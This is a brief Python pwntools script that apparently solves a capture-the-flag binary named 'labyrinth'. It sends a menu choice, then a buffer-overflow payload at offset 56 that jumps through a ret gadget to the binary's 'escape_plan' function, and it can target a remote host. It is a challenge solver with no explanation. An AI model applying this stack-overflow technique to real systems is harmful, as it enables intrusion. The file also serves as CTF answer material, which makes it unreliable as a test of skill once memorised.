from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = './labyrinth'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 56
ret = ROP(elf).find_gadget(['ret'])[0]
payload = flat({offset : [ret, elf.sym['escape_plan']]})

io.sendline(b'69')
io.sendline(payload)

io.interactive()

